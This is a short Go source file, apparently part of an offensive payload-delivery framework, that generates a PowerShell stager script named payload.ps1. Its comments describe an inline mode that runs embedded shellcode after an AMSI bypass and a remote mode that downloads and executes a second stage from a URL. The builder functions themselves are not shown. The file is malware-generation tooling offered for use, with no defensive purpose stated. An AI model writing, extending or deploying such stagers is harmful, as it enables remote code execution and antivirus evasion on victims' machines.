// ps1.go — emit a PowerShell stager .ps1. Inline mode runs the embedded
// shellcode (AMSI-bypass + VirtualAlloc/CreateThread); remote mode does an
// IEX download-and-exec of the --url stage-2. Run via `powershell -File` or
// `powershell -c` (or `powershell -enc` of the one-liner — see ps1StagerOneLine).
package delivery

type ps1Emitter struct{}

func (ps1Emitter) Name() string { return "ps1" }
func (ps1Emitter) Ext() string  { return "ps1" }

func (ps1Emitter) Emit(s *Spec) ([]Artifact, error) {
	var body string
	switch {
	case s.Remote():
		body = ps1Fetch(s.URL) + "\n"
	case len(s.Shellcode) > 0:
		body = ps1StagerBody(s.Shellcode)
	default:
		return nil, errPayloadRequired("ps1")
	}
	return []Artifact{writeFile("payload.ps1", []byte(body))}, nil
}